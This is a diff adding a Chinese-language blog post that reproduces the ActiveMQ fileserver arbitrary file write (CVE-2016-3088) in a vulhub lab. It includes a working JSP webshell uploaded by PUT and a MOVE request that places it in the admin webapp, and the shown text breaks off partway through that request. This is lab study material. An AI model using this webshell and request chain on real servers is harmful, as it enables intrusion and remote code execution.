@@ -1,0 +1,490 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>
+    ebandeng-ActiveMQ任意文件写入漏洞
+  </title>
+<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="ebandeng" type="application/atom+xml">
+</head>
+
+  
+    <link rel="stylesheet" href="/css/lengux.css">
+    
+      
+
+        <body>
+          <div class="container headertop">
+  <div class="menu-top">
+     <div class="timer"></div>
+ 
+  </div>
+ 
+
+  <div class="menu-list">
+    
+      <a href="/">
+        home
+      </a>
+      
+      <a href="/about">
+        about
+      </a>
+      
+      <a href="/archives">
+        archives
+      </a>
+      
+      <a href="/link">
+        link
+      </a>
+      
+        
+          <span class="darkmodes" ><svg   xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-moon-stars-fill" viewBox="0 0 16 16">
+  <path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+  <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/>
+</svg></span>
+            
+  </div>
+
+</div>
+            <div class="header-top">
+  <!-- <div class="header-flex"><a href="/">
+      <img class="icon" src= alt="">
+    </a>
+  </div> -->
+  <div class="menu-list">
+    
+      <a href="/">
+        home
+      </a>
+      
+      <a href="/about">
+        about
+      </a>
+      
+      <a href="/archives">
+        archives
+      </a>
+      
+      <a href="/link">
+        link
+      </a>
+      
+        
+          <span class="darkmodes" ><svg   xmlns="http://www.w3.org/2000/svg" width="16" height="16" fill="currentColor" class="bi bi-moon-stars-fill" viewBox="0 0 16 16">
+  <path d="M6 .278a.768.768 0 0 1 .08.858 7.208 7.208 0 0 0-.878 3.46c0 4.021 3.278 7.277 7.318 7.277.527 0 1.04-.055 1.533-.16a.787.787 0 0 1 .81.316.733.733 0 0 1-.031.893A8.349 8.349 0 0 1 8.344 16C3.734 16 0 12.286 0 7.71 0 4.266 2.114 1.312 5.124.06A.752.752 0 0 1 6 .278z"/>
+  <path d="M10.794 3.148a.217.217 0 0 1 .412 0l.387 1.162c.173.518.579.924 1.097 1.097l1.162.387a.217.217 0 0 1 0 .412l-1.162.387a1.734 1.734 0 0 0-1.097 1.097l-.387 1.162a.217.217 0 0 1-.412 0l-.387-1.162A1.734 1.734 0 0 0 9.31 6.593l-1.162-.387a.217.217 0 0 1 0-.412l1.162-.387a1.734 1.734 0 0 0 1.097-1.097l.387-1.162zM13.863.099a.145.145 0 0 1 .274 0l.258.774c.115.346.386.617.732.732l.774.258a.145.145 0 0 1 0 .274l-.774.258a1.156 1.156 0 0 0-.732.732l-.258.774a.145.145 0 0 1-.274 0l-.258-.774a1.156 1.156 0 0 0-.732-.732l-.774-.258a.145.145 0 0 1 0-.274l.774-.258c.346-.115.617-.386.732-.732L13.863.1z"/>
+</svg></span>
+            
+  </div>
+
+  <svg class="list" id="list" xmlns="http://www.w3.org/2000/svg" width="30" height="30" fill="currentColor"
+    class="bi bi-list" viewBox="0 0 16 16">
+    <path fill-rule="evenodd"
+      d="M2.5 12a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5zm0-4a.5.5 0 0 1 .5-.5h10a.5.5 0 0 1 0 1H3a.5.5 0 0 1-.5-.5z" />
+  </svg>
+</div>
+              <div class="p-4 p-md-5 mb-4 rounded bgimg"
+    style="height: 100vh;display: flex;justify-content: center;align-items: center;">
+    <div class="px-4 py-5 my-5 text-center" style="overflow: hidden;">
+        <!-- <img class="d-block mx-auto mb-4" src= alt="" style="width: 200px;height: 200px;"> -->
+        <div class="display-5 fw-bold">
+            <div class="wrapper">
+                <div class="typing-demo">
+                    This is a ebandeng blog.
+                </div>
+            </div>
+        </div>
+
+        <div class="col-lg-6 mx-auto">
+            <p class="lead mb-4">
+                地下室里有一罐泡在福尔马林里的老鼠，我嘲笑他被液体困在方寸之地，它告诉我他泡在福尔马林里防止肉体腐烂它和泡在酒精里期望保持鲜活思想大脑的我一样可笑，只是被一堆无聊的液体拘于一角之隅的标本。
+            </p>
+            <div class="d-grid gap-2 d-sm-flex justify-content-sm-center" id="linkshear">
+                <a href=https://github.com/XUSHAO11/Lengux>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor"
+                        class="bi bi-github darksvg" viewBox="0 0 16 16">
+                        <path
+                            d="M8 0C3.58 0 0 3.58 0 8c0 3.54 2.29 6.53 5.47 7.59.4.07.55-.17.55-.38 0-.19-.01-.82-.01-1.49-2.01.37-2.53-.49-2.69-.94-.09-.23-.48-.94-.82-1.13-.28-.15-.68-.52-.01-.53.63-.01 1.08.58 1.23.82.72 1.21 1.87.87 2.33.66.07-.52.28-.87.51-1.07-1.78-.2-3.64-.89-3.64-3.95 0-.87.31-1.59.82-2.15-.08-.2-.36-1.02.08-2.12 0 0 .67-.21 2.2.82.64-.18 1.32-.27 2-.27.68 0 1.36.09 2 .27 1.53-1.04 2.2-.82 2.2-.82.44 1.1.16 1.92.08 2.12.51.56.82 1.27.82 2.15 0 3.07-1.87 3.75-3.65 3.95.29.25.54.73.54 1.48 0 1.07-.01 1.93-.01 2.2 0 .21.15.46.55.38A8.012 8.012 0 0 0 16 8c0-4.42-3.58-8-8-8z" />
+                    </svg>
+                </a>
+                <a href=https://tweetdeck.twitter.com/login>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor"
+                        class="bi bi-twitter darksvg" viewBox="0 0 16 16">
+                        <path
+                            d="M5.026 15c6.038 0 9.341-5.003 9.341-9.334 0-.14 0-.282-.006-.422A6.685 6.685 0 0 0 16 3.542a6.658 6.658 0 0 1-1.889.518 3.301 3.301 0 0 0 1.447-1.817 6.533 6.533 0 0 1-2.087.793A3.286 3.286 0 0 0 7.875 6.03a9.325 9.325 0 0 1-6.767-3.429 3.289 3.289 0 0 0 1.018 4.382A3.323 3.323 0 0 1 .64 6.575v.045a3.288 3.288 0 0 0 2.632 3.218 3.203 3.203 0 0 1-.865.115 3.23 3.23 0 0 1-.614-.057 3.283 3.283 0 0 0 3.067 2.277A6.588 6.588 0 0 1 .78 13.58a6.32 6.32 0 0 1-.78-.045A9.344 9.344 0 0 0 5.026 15z" />
+                    </svg>
+                </a>
+                <a href=/>
+                    <svg xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor"
+                        class="bi bi-display darksvg" viewBox="0 0 16 16">
+                        <path
+                            d="M0 4s0-2 2-2h12s2 0 2 2v6s0 2-2 2h-4c0 .667.083 1.167.25 1.5H11a.5.5 0 0 1 0 1H5a.5.5 0 0 1 0-1h.75c.167-.333.25-.833.25-1.5H2s-2 0-2-2V4zm1.398-.855a.758.758 0 0 0-.254.302A1.46 1.46 0 0 0 1 4.01V10c0 .325.078.502.145.602.07.105.17.188.302.254a1.464 1.464 0 0 0 .538.143L2.01 11H14c.325 0 .502-.078.602-.145a.758.758 0 0 0 .254-.302 1.464 1.464 0 0 0 .143-.538L15 9.99V4c0-.325-.078-.502-.145-.602a.757.757 0 0 0-.302-.254A1.46 1.46 0 0 0 13.99 3H2c-.325 0-.502.078-.602.145z" />
+                    </svg>
+                </a>
+
+            </div>
+        </div>
+    </div>
+    <svg id="updown" class="darksvg" xmlns="http://www.w3.org/2000/svg" width="40" height="40" fill="currentColor"
+        class="bi bi-chevron-compact-down" viewBox="0 0 16 16">
+        <path fill-rule="evenodd"
+            d="M1.553 6.776a.5.5 0 0 1 .67-.223L8 9.44l5.776-2.888a.5.5 0 1 1 .448.894l-6 3a.5.5 0 0 1-.448 0l-6-3a.5.5 0 0 1-.223-.67z" />
+    </svg>
+</div>
+                <div id="content-outer">
+                  <div id="content-inner">
+                    <main class="container">
+                      <div class="row g-5">
+                        <div class="col-md-8">
+                          
+<article id="post">
+    <h1>ActiveMQ任意文件写入漏洞
+    </h1>
+    <h2 id="背景简述"><a href="#背景简述" class="headerlink" title="背景简述"></a><strong>背景简述</strong></h2><p>ActiveMQ的web控制台分为三个应用，admin、api和fileserver，其中admin是管理员页面，api是接口，fileserver是储存文件的接口；admin和api都需要登录后才能使用，fileserver无需登录。</p>
+<p>fileserver是一个RESTful API接口，我们可以通过GET、PUT、DELETE等HTTP请求对其中存储的文件进行读写操作，其设计目的是为了弥补消息队列操作不能传输、存储二进制文件的缺陷，但后来发现：</p>
+<blockquote>
+<p>其使用率并不高</p>
+<p>文件操作容易出现漏洞</p>
+</blockquote>
+<p>所以，<strong>ActiveMQ在5.12.x~5.13.x版本中，已经默认关闭了fileserver这个应用（可以在conf&#x2F;jetty.xml中开启）；在5.14.0版本以后，彻底删除了fileserver应用。</strong></p>
+<p>在测试过程中，可以<strong>关注ActiveMQ的版本</strong>，避免走弯路。</p>
+<h2 id="漏洞详情"><a href="#漏洞详情" class="headerlink" title="漏洞详情"></a><strong>漏洞详情</strong></h2><p>本漏洞出现在fileserver应用中，漏洞原理其实非常简单，就是fileserver支持写入文件（但不解析jsp），同时支持移动文件（MOVE请求）。所以，我们只需要写入一个文件，然后使用MOVE请求将其移动到任意位置，造成任意文件写入漏洞。</p>
+<p>文件写入有几种利用方法：</p>
+<blockquote>
+<p>写入webshell</p>
+<p>写入cron或ssh key等文件</p>
+<p>写入jar或jetty.xml等库和配置文件</p>
+</blockquote>
+<p>写入webshell的好处是，门槛低更方便，但前面也说了fileserver不解析jsp，admin和api两个应用都需要登录才能访问，所以有点鸡肋；写入cron或ssh key，好处是直接反弹拿shell，也比较方便，缺点是需要root权限；写入jar，稍微麻烦点（需要jar的后门），写入xml配置文件，这个方法比较靠谱，但有个鸡肋点是：我们需要知道activemq的绝对路径。</p>
+<h2 id="知识拓展"><a href="#知识拓展" class="headerlink" title="知识拓展"></a><strong>知识拓展</strong></h2><p>背景简述和漏洞详情里面有几点和漏洞强相关的知识点是我之前没有接触过的，需要学习和理解一下：</p>
+<blockquote>
+<p>cron是什么</p>
+<p>反弹shell是什么</p>
+<p>cron或ssh key和反弹shell的关系</p>
+<p>jetty和jetty.xml是什么</p>
+<p>linux文件权限</p>
+</blockquote>
+<p>下面来一个一个了解一下：</p>
+<h3 id="cron是什么"><a href="#cron是什么" class="headerlink" title="cron是什么"></a><strong>cron是什么</strong></h3><p>在这个链接找到了cron的介绍：<a target="_blank" rel="noopener" href="https://www.simcf.cc/9288.html">Cron是什么？利用Cron Job自动执行定时任务</a></p>
+<p>简单来说，cron是linux系统的守护进程，用于在特定时间自动执行重复任务。</p>
+<h3 id="反弹shell是什么"><a href="#反弹shell是什么" class="headerlink" title="反弹shell是什么"></a><strong>反弹shell是什么</strong></h3><p>简单来说反弹shell（reverse shell）就是反向的shell，是相对于标准shell的一个概念。</p>
+<p>标准shell是攻击者作为客户端去连接目标服务器；</p>
+<p>而反弹shell是攻击者作为服务器，监听某端口，而目标设备作为客户端主动连接攻击者。</p>
+<p>反弹shell的应用场景：</p>
+<blockquote>
+<p>目标机在局域网内</p>
+<p>目标机ip地址是动态的</p>
+<p>有防火墙等限制，目标机只能发请求，不能收请求</p>
+<p>不确定目标机何时具备连接条件</p>
+</blockquote>
+<p>这部分主要参考：<a target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/138393396">反弹shell原理与实现</a></p>
+<p>至于具体的反弹shell百度一搜全都是，就不说了。</p>
+<h3 id="cron或ssh-key和反弹shell的关系"><a href="#cron或ssh-key和反弹shell的关系" class="headerlink" title="cron或ssh key和反弹shell的关系"></a><strong>cron或ssh key和反弹shell的关系</strong></h3><p>cron和反弹shell的关系很好理解，就是往目标机的定时任务文件中写反弹shell脚本；</p>
+<p>ssh key和反弹shell的关系，从网上查到的资料看，是往目标机里面写了攻击机的ssh key（公钥）之后，攻击机就可以免密登录目标机。可是这不还是攻击机做客户端，目标机做服务器么？还是需要目标机开启ssh服务，并且允许攻击机连接，和反弹关系不大呀。。。小小的脑袋，大大的问号，也不知道是牵强附会，还是我没找到正确的资料。。</p>
+<p>这部分主要参考：</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_36119192/article/details/84641379">Linux反弹shell</a></p>
+<p><a target="_blank" rel="noopener" href="https://www.freebuf.com/vuls/148758.html">不请自来 | Redis 未授权访问漏洞深度利用</a></p>
+<h3 id="jetty和jetty-xml是什么"><a href="#jetty和jetty-xml是什么" class="headerlink" title="jetty和jetty.xml是什么"></a><strong>jetty和jetty.xml是什么</strong></h3><p>简单来说，jetty是一种开源的servlet容器，是基于java的web容器，和tomcat是一类东西。jetty是通过API或者XML文件进行配置的，而jetty.xml是jetty的一个重要配置文件。</p>
+<h3 id="linux文件权限"><a href="#linux文件权限" class="headerlink" title="linux文件权限"></a><strong>linux文件权限</strong></h3><p>vulhub官网教程中，据不完全统计，至少有两句话提到了权限相关的问题：</p>
+<blockquote>
+<p>This method requires the ActiveMQ run as root, otherwise it will not be able to write to the cron file.</p>
+<p>这个方法需要ActiveMQ是root运行，否则也不能写入cron文件。</p>
+<p>In some cases, the owner of jetty.xml and jar is the user of the web container, so the success rate of writing crontab is higher.</p>
+<p>有的情况下，jetty.xml和jar的所有人是web容器的用户，所以相比起来，写入crontab成功率更高一点。</p>
+</blockquote>
+<p>总而言之，由于是通过ActiveMQ进行文件上传，因此运行ActiveMQ的用户必须有目标文件夹，或者需要修改的文件的写权限才行。</p>
+<p>那么要确定能否写入或者修改文件，就需要确定两件事情：</p>
+<blockquote>
+<p>文件或文件夹权限</p>
+<p>运行ActiveMQ的用户</p>
+</blockquote>
+<p>下面就以&#x2F;etc&#x2F;cron.d目录和jetty.xml文件来演示如何获取以上两点信息。（<strong>这部分内容仅仅是知识扩展，对于实际攻击没什么意义</strong>）</p>
+<h4 id="文件或文件夹权限"><a href="#文件或文件夹权限" class="headerlink" title="文件或文件夹权限"></a><strong>文件或文件夹权限</strong></h4><p>首先需要运行docker容器activemq&#x2F;CVE-2016-3088</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker-compose up -d</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/Image.jpg" alt="Image"></p>
+<p>然后可以通过登录网页<a target="_blank" rel="noopener" href="http://your-ip:8161/%E7%A1%AE%E8%AE%A4%E5%AE%B9%E5%99%A8%E8%BF%90%E8%A1%8C%E6%88%90%E5%8A%9F">http://your-ip:8161/确认容器运行成功</a></p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594341516-14.jpg" alt="Image"></p>
+<p>接下来用下面的命令查看正在运行的docker容器id</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker container ps</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594430099-16.jpg" alt="Image"></p>
+<p>然后用下面这个命令进入容器</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo docker exec -it 容器id /bin/bash</span><br></pre></td></tr></table></figure>
+
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594467496-18.jpg" alt="Image"></p>
+<p>然后就用cd命令定位到我们想观察的点，再ls -l看看文件夹和文件的所有者和权限设置</p>
+<p>从下图中可以看到&#x2F;etc&#x2F;cron.d目录的所有者是root，root用户的权限是可读写可执行；root组和其他组用户权限都是可读可执行。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594489177-20.jpg" alt="Image"></p>
+<p>而从下图中可以看到jetty.xml文件的所有者也是root，root用户的权限是可读写，其他用户的权限是可读。</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594503923-22.jpg" alt="Image"></p>
+<p>运行ActiveMQ的用户</p>
+<p>我想到两种方法查看运行ActiveMQ的用户：</p>
+<p>第一种 通过ps命令</p>
+<p>容器里面是没有ps命令的，需要用下面的命令先安装一下</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get update &amp;&amp; apt-get install procps</span><br></pre></td></tr></table></figure>
+
+<p>安装好之后，用下面的命令查看运行activemq console的用户</p>
+<p>ps aux</p>
+<p>第二种 通过网页</p>
+<p>访问网页：<a target="_blank" rel="noopener" href="http://your-ip:8161/admin/test/systemProperties.jsp%E5%8F%AF%E4%BB%A5%E7%9C%8B%E5%88%B0%E8%BF%90%E8%A1%8CActiveMQ%E7%9A%84%E7%94%A8%E6%88%B7%E6%98%AFroot%EF%BC%9A">http://your-ip:8161/admin/test/systemProperties.jsp可以看到运行ActiveMQ的用户是root：</a></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240513180456744.png" alt="image-20240513180456744"></p>
+<p>综上所述，运行ActiveMQ的用户是root，而root对&#x2F;etc&#x2F;cron.d目录和jetty.xml文件都是有写权限的，因此理论上上传crontab文件，以及修改jetty.xml文件都应该是可实现的。</p>
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a><strong>漏洞复现</strong></h2><h3 id="版本要求"><a href="#版本要求" class="headerlink" title="版本要求"></a><strong>版本要求</strong></h3><p>根据vulhub上的背景简述可知，该漏洞影响版本是ActiveMQ在5.14.0之前的版本（不包括5.14.0）。</p>
+<p>既然是vulhub提供的漏洞复现环境，那版本肯定是没问题的啦，不过如果想要确认一下版本的话，可以用浏览器访问<a target="_blank" rel="noopener" href="http://your-ip:8161/admin/">http://your-ip:8161/admin/</a></p>
+<p><img src="/imgs/$%7Bfiilename%7D/image-20240513180533703.png" alt="image-20240513180533703"></p>
+<h3 id="途径1：写入webshell"><a href="#途径1：写入webshell" class="headerlink" title="途径1：写入webshell"></a><strong>途径1：写入webshell</strong></h3><p>前提条件</p>
+<blockquote>
+<p>需要知道ActiveMQ的绝对路径</p>
+<p>需要能登录admin或者api</p>
+</blockquote>
+<p>思路分析</p>
+<p>由于要满足以上两个前提条件，并且ActiveMQ的绝对路径可以通过<a target="_blank" rel="noopener" href="http://your-ip:8161/admin/test/systemProperties.jsp%E9%A1%B5%E9%9D%A2%E8%8E%B7%E5%8F%96%EF%BC%8C%E8%80%8C%E8%BF%99%E4%B8%AA%E9%A1%B5%E9%9D%A2%E4%B9%9F%E9%9C%80%E8%A6%81%E7%99%BB%E5%BD%95admin%E4%B9%8B%E5%90%8E%E6%89%8D%E8%83%BD%E8%AE%BF%E9%97%AE%E3%80%82%E5%9B%A0%E6%AD%A4%EF%BC%8C%E5%BA%94%E8%AF%A5%E6%8C%89%E7%85%A7%E5%A6%82%E4%B8%8B%E6%AD%A5%E9%AA%A4%E5%AE%9E%E6%96%BD%E6%94%BB%E5%87%BB%EF%BC%9A">http://your-ip:8161/admin/test/systemProperties.jsp页面获取，而这个页面也需要登录admin之后才能访问。因此，应该按照如下步骤实施攻击：</a></p>
+<blockquote>
+<p>获取admin应用的用户名和密码</p>
+<p>访问<a target="_blank" rel="noopener" href="http://your-ip:8161/admin/test/systemProperties.jsp%E8%8E%B7%E5%8F%96ActiveMQ%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84">http://your-ip:8161/admin/test/systemProperties.jsp获取ActiveMQ的绝对路径</a></p>
+<p>上传webshell</p>
+<p>将webshell移动到admin所在文件夹</p>
+<p>连接webshell</p>
+</blockquote>
+<p>利用步骤</p>
+<p>1、获取admin应用的用户名和密码</p>
+<p>不是重点，不详细说了，而且这个步骤放在这篇文章里完全是为了攻击链的完整性，其实vulhub的教程已经说了默认用户名和密码都是admin。</p>
+<p>我能想到的几种获取用户名和密码的方法：</p>
+<blockquote>
+<p>尝试默认用户名和密码</p>
+<p>尝试弱口令（暴力破解）</p>
+<p>社工</p>
+</blockquote>
+<p>暴力破解可以用Burp Suite的intruder模块。</p>
+<p>2、获取ActiveMQ的绝对路径</p>
+<p>得到admin应用的用户名和密码之后，就可以访问网页<a target="_blank" rel="noopener" href="http://your-ip:8161/admin/test/systemProperties.jsp%E6%9D%A5%E8%8E%B7%E5%8F%96ActiveMQ%E7%9A%84%E7%BB%9D%E5%AF%B9%E8%B7%AF%E5%BE%84%E4%BA%86%EF%BC%8C%E5%85%B7%E4%BD%93%E8%A7%81%E4%B8%8B%E5%9B%BE%E7%BA%A2%E6%A1%86%E6%A1%86%E3%80%82">http://your-ip:8161/admin/test/systemProperties.jsp来获取ActiveMQ的绝对路径了，具体见下图红框框。</a></p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image.png" alt="Image"></p>
+<p>3、上传webshell</p>
+<p>先得把webshell上传到fileserver，之后才能从fileserver转移。由于ActiveMQ是个java程序，因此需要传个jsp webshell。</p>
+<p>在网上找了个jsp webshell：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_43615820/article/details/116357744">蚁剑jsp一句话木马</a></p>
+<p>用PUT方法把webshell上传到fileserver：</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/fileserver/ele.txt</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=nc4v0my0vmaso0b829zo2e5f</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>https://1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run/</span><br><span class="line"><span class="attribute">Authorization</span><span class="punctuation">: </span>Basic YWRtaW46YWRtaW4=</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">Sec-Fetch-Dest</span><span class="punctuation">: </span>document</span><br><span class="line"><span class="attribute">Sec-Fetch-Mode</span><span class="punctuation">: </span>navigate</span><br><span class="line"><span class="attribute">Sec-Fetch-Site</span><span class="punctuation">: </span>same-origin</span><br><span class="line"><span class="attribute">Sec-Fetch-User</span><span class="punctuation">: </span>?1</span><br><span class="line"><span class="attribute">Te</span><span class="punctuation">: </span>trailers</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>780</span><br><span class="line"></span><br><span class="line"><span class="language-gradle"></span></span><br><span class="line"><span class="language-gradle">&lt;%!</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">class</span> U <span class="keyword">extends</span> ClassLoader &#123;</span></span><br><span class="line"><span class="language-gradle">U(ClassLoader c) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">super</span>(c);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">Class</span> g(<span class="keyword">byte</span>[] b) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> <span class="keyword">super</span>.defineClass(b, <span class="number">0</span>, b.length);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">public</span> <span class="keyword">byte</span>[] base64Decode(String str) <span class="keyword">throws</span> Exception &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">try</span> &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;sun.misc.BASE64Decoder&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) clazz.getMethod(<span class="string">&quot;decodeBuffer&quot;</span>, String.<span class="keyword">class</span>).invoke(clazz.newInstance(), str);</span></span><br><span class="line"><span class="language-gradle">&#125; <span class="keyword">catch</span> (Exception e) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">Class</span> clazz = <span class="keyword">Class</span>.forName(<span class="string">&quot;java.util.Base64&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">Object decoder = clazz.getMethod(<span class="string">&quot;getDecoder&quot;</span>).invoke(<span class="keyword">null</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">return</span> (<span class="keyword">byte</span>[]) decoder.getClass().getMethod(<span class="string">&quot;decode&quot;</span>, String.<span class="keyword">class</span>).invoke(decoder, str);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle">String cls = request.getParameter(<span class="string">&quot;passwd&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span> (cls != <span class="keyword">null</span>) &#123;</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">new</span> U(<span class="keyword">this</span>.getClass().getClassLoader()).g(base64Decode(cls)).newInstance().equals(pageContext);</span></span><br><span class="line"><span class="language-gradle">&#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>Response报文状态码204表示上传成功：</p>
+<p><img src="/imgs/$%7Bfiilename%7D/Image-1715594854417-27.png" alt="Image"></p>
+<p>4、将webshell移动到admin所在文件夹</p>
+<p>用MOVE方法进行webshell的移动</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">MOVE</span> <span class="string">/fileserver/ele.txt</span> <span class="meta">HTTP/2</span></span><br><span class="line"><span class="attribute">Destination</span><span class="punctuation">: </span>file:///opt/activemq/webapps/admin/ele.jsp</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>1774-0c4e2302-81dd-47b3-b00a-4f026f54df7d.do-not-trust.hacking.run</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=nc4v0my0vmaso0b829zo2e5f</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:100.0) Gecko/20100101 Firefox/100.0</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span 